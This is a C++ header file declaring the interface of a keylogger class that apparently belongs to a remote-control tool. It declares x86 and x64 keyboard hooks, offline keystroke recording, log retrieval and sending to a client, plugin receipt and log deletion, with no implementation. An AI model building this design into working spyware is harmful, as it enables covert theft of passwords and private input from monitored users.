// KeybdLogger.h: interface for the CKeybdLogger class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KEYBDLOGGER_H__7BE18E12_D987_4122_AA4D_0F5FCEEB0C22__INCLUDED_)
#define AFX_KEYBDLOGGER_H__7BE18E12_D987_4122_AA4D_0F5FCEEB0C22__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#include "EventHandler.h"
#include "kblog_common.h"
#include "module.h"

class CKeybdLogger:public CEventHandler
{
private:
	Module * m_owner;


	static HANDLE hBackgroundProcess_x86;
	static DWORD dwBackgroundThreadId_x86;

	static HANDLE hBackgroundProcess_x64;
	static DWORD dwBackgroundThreadId_x64;

	static BOOL	bOfflineRecord;

	static DWORD	dwSendSize;

	static volatile long mutex;

	void Lock();
	void Unlock();

	BOOL CheckFile(bool x64 = false);
	void GetPlugs();
	BOOL IsX64();

	BOOL InstallX86Hook();
	BOOL InstallX64Hook();

	void UnhookX86();
	void UnhookX64();

	void CheckOldProcess();

public:
	CKeybdLogger(CClient *pClient, Module * owner);
	virtual ~CKeybdLogger();
	
	void ExitBackgroundProcess();
	
	void OnSetOfflineRecord(bool bOffline);
	void OnGetLog();
	void OnRecvPlug(char* zipData,DWORD dwSize);
	void OnDeleteLog();


	void OnOpen();
	void OnClose();

	void OnEvent(UINT32 e, BYTE *lpData, UINT32 Size);
};

#endif // !defined(AFX_KEYBDLOGGER_H__7BE18E12_D987_4122_AA4D_0F5FCEEB0C22__INCLUDED_)
